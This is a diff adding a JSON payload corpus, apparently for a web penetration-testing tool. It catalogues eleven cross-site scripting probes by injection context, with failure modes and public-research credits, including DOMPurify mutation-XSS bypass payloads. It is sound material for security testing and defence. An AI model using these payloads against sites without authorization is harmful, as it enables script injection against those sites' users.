@@ -1,0 +1,195 @@
+{
+  "corpus": "XSS",
+  "organ": "xss-playbook",
+  "vuln_class": "cross_site_scripting",
+  "corpus_version": "1.0.0",
+  "house_rules": [
+    "Payloads below are transcribed from the public record and attributed per entry - this corpus never invents payloads.",
+    "alert(1) in a probe stands for the operator's canary marker (MYTHOS-CANARY-<uuid>) at execution time - never ship alert() theater (organ doctrine).",
+    "Context first: a payload is only valid for the sink context it was written for; classify the context (references/contexts.md) BEFORE choosing an entry.",
+    "failure_modes are mandatory reading BEFORE closing a hypothesis as negative: a payload that failed for a listed reason leaves the sink untested, not safe."
+  ],
+  "entries": [
+    {
+      "id": "XSS-001",
+      "technique": "HTML body context - element with inline event handler",
+      "prerequisites": ["reflection/insertion into HTML body element position"],
+      "probe": "<svg onload=alert(1)>",
+      "oracle": "marker executes on load; body artifact shows the element surviving into the DOM",
+      "failure_modes": [
+        "CSP script-src without 'unsafe-inline' (or with nonce/hash) blocks the inline handler - the injection succeeded, execution did not: record CSP as the limiting fact",
+        "input filtered for < or specific tags - switch context class, do not spray variants",
+        "sanitizer strips the element on output - re-test via mutation entries (XSS-007..010) before concluding safe"
+      ],
+      "source": {
+        "credit": "canonical, cross-verified",
+        "title": "PortSwigger XSS cheat sheet",
+        "url": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+      }
+    },
+    {
+      "id": "XSS-002",
+      "technique": "double-quoted attribute context breakout",
+      "prerequisites": ["insertion inside a double-quoted attribute value"],
+      "probe": "\"><img src=x onerror=alert(1)>",
+      "oracle": "quote closes the attribute, new element parses; marker executes on image error",
+      "failure_modes": [
+        "output encoding escapes the quote (&quot;) - the context is closed properly; encode-then-store flows re-encode on render",
+        "unquoted/single-quoted attribute contexts need their own breakout - verify the actual quoting byte first"
+      ],
+      "source": {
+        "credit": "canonical, cross-verified",
+        "title": "PortSwigger XSS cheat sheet",
+        "url": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+      }
+    },
+    {
+      "id": "XSS-003",
+      "technique": "unquoted attribute context / attribute injection without breakout",
+      "prerequisites": ["insertion after an unquoted attribute value or into a tag's attribute area"],
+      "probe": "autofocus onfocus=alert(1)",
+      "oracle": "focus fires on load without any user interaction; no quote breakout needed",
+      "failure_modes": [
+        "CSP blocks inline handlers (same as XSS-001)",
+        "the insertion point quotes or escapes the space between tokens - the second attribute never parses"
+      ],
+      "source": {
+        "credit": "canonical, cross-verified",
+        "title": "PortSwigger XSS cheat sheet",
+        "url": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+      }
+    },
+    {
+      "id": "XSS-004",
+      "technique": "JavaScript string-literal context breakout",
+      "prerequisites": ["insertion inside a JS string literal in a script block"],
+      "probe": "'-alert(1)-'",
+      "oracle": "string concatenation splices the marker call between string literals; executes when the statement runs",
+      "failure_modes": [
+        "output JSON-encodes into the string (quotes escaped) - the literal stays closed",
+        "the block never executes (dead code / conditional) - execution context must be verified, not assumed"
+      ],
+      "source": {
+        "credit": "canonical, cross-verified",
+        "title": "PortSwigger XSS cheat sheet (JS context vectors)",
+        "url": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+      }
+    },
+    {
+      "id": "XSS-005",
+      "technique": "script raw-text context breakout",
+      "prerequisites": ["insertion inside a <script> block (raw text element)"],
+      "probe": "</script><img src=x onerror=alert(1)>",
+      "oracle": "the closing tag ends the raw-text context whatever the string state inside; following markup parses as HTML",
+      "failure_modes": [
+        "encoder escapes < to &lt; inside script text (correct behavior - raw text rules make this rare but stack-dependent)",
+        "JSON-P callbacks that re-wrap the value - the breakout lands inside a JS string in ANOTHER script block; re-classify context"
+      ],
+      "source": {
+        "credit": "canonical, cross-verified",
+        "title": "PortSwigger XSS cheat sheet",
+        "url": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+      }
+    },
+    {
+      "id": "XSS-006",
+      "technique": "URL scheme context (navigational sink)",
+      "prerequisites": ["insertion into href/src/action or a redirect target"],
+      "probe": "javascript:alert(1)//",
+      "oracle": "navigation executes script under the origin; the // comments out any trailing template text",
+      "failure_modes": [
+        "CSP (e.g. script-src, or object-src/srcset rules) or a scheme allowlist on the sink",
+        "framework sanitizes URLs (Angular sanitizer, DOMPurify URI validation)",
+        "sink is never navigated by a user gesture - impact requires a trigger path; note it in the report instead of assuming"
+      ],
+      "source": {
+        "credit": "canonical, cross-verified",
+        "title": "PortSwigger XSS cheat sheet (URL context)",
+        "url": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+      }
+    },
+    {
+      "id": "XSS-007",
+      "technique": "mXSS - noscript context-switch mutation",
+      "prerequisites": [
+        "sanitized output assigned via innerHTML in a scripting-enabled browser",
+        "sanitizer parses the payload inside <noscript> as inert text"
+      ],
+      "probe": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+      "oracle": "on re-parse in the live document the noscript content model flips (scripting enabled = raw text), the title attribute's markup executes as real nodes: the img lands OUTSIDE noscript and fires",
+      "failure_modes": [
+        "target is a no-script or server-side render path - the mutation never triggers",
+        "modern sanitizer double-parse (parse-after-serialize verification) catches the mutation - pin the sanitizer version as a ledgered fact before retrying variants",
+        "mutation is engine-specific - record which engine verified the mutation, do not generalize across browsers"
+      ],
+      "source": {
+        "credit": "mXSS research (canonical example, widely reproduced)",
+        "title": "PentesterLab glossary - Mutation XSS (mXSS); Sonar mXSS cheatsheet",
+        "url": "https://pentesterlab.com/glossary/mutation-xss"
+      }
+    },
+    {
+      "id": "XSS-008",
+      "technique": "mXSS - svg foreign-content re-serialization (DOMPurify 2.0.0 bypass)",
+      "prerequisites": ["DOMPurify 2.0.0-era sink with default config"],
+      "probe": "<svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\">",
+      "oracle": "HTML-in-SVG parse mutates the tree on serialize/re-parse; the style raw-text content re-interprets, the img escapes and executes",
+      "failure_modes": [
+        "DOMPurify patched (>2.0.0 chain of fixes) - version-pin the sink before claiming the class is closed",
+        "sink is not a serialize/re-parse pipeline (direct DOM fragment insertion) - mutation window absent"
+      ],
+      "source": {
+        "credit": "Michal Bentkowski (@SecurityMB)",
+        "title": "DOMPurify bypass using mXSS",
+        "url": "https://research.securitum.com/dompurify-bypass-using-mxss/"
+      }
+    },
+    {
+      "id": "XSS-009",
+      "technique": "mXSS - MathML form-pointer namespace confusion (DOMPurify 2.0.17 bypass)",
+      "prerequisites": ["DOMPurify up to 2.0.17 with default config, innerHTML sink"],
+      "probe": "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
+      "oracle": "the mis-nested </form> resets the form element pointer so the second <form> parses INSIDE math/mtext; serialization re-orders namespaces and the style content re-parses as HTML - img executes",
+      "failure_modes": [
+        "fixed in DOMPurify >2.0.17 - this exact payload is a version ORACLE: its failure dates the sink's sanitizer, which is itself a ledgered FACT",
+        "no form-pointer behavior in the live engine (spec-conformant parser required) - engine-specific"
+      ],
+      "source": {
+        "credit": "Michal Bentkowski (@SecurityMB)",
+        "title": "Mutation XSS via MathML mutation - DOMPurify 2.0.17 bypass",
+        "url": "https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/"
+      }
+    },
+    {
+      "id": "XSS-010",
+      "technique": "mXSS - MathML mtext/table/mglyph/style with comment nesting (DOMPurify 2.0.17 bypass)",
+      "prerequisites": ["DOMPurify up to 2.0.17, innerHTML sink, HTML comment handling in play"],
+      "probe": "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;\">",
+      "oracle": "mglyph puts the parser in a state where style content mutates through a comment re-serialization; the title attribute value re-parses as markup - the inner img fires",
+      "failure_modes": [
+        "fixed in later DOMPurify - same version-oracle property as XSS-009",
+        "the HTML-entity encoded title only mutates in engines that decode entities during attribute re-parse - verify per engine"
+      ],
+      "source": {
+        "credit": "Gareth Heyes (@garethheyes)",
+        "title": "Bypassing DOMPurify again with mutation XSS",
+        "url": "https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss"
+      }
+    },
+    {
+      "id": "XSS-011",
+      "technique": "legacy backtick attribute mutation (IE-era)",
+      "prerequisites": ["legacy IE/old-Edge rendering path", "attribute-context insertion"],
+      "probe": "<img src=`x`onerror=alert(1)>",
+      "oracle": "the legacy engine treats backticks as attribute delimiters - the onerror attribute parses as separate from src",
+      "failure_modes": [
+        "modern engines never treat backticks as quotes - class is dead except on legacy enterprise targets; record the engine version if it fires"
+      ],
+      "source": {
+        "credit": "legacy mXSS research (IE-era attribute parsing)",
+        "title": "PentesterLab glossary - Mutation XSS (backtick example)",
+        "url": "https://pentesterlab.com/glossary/mutation-xss"
+      }
+    }
+  ]
+}
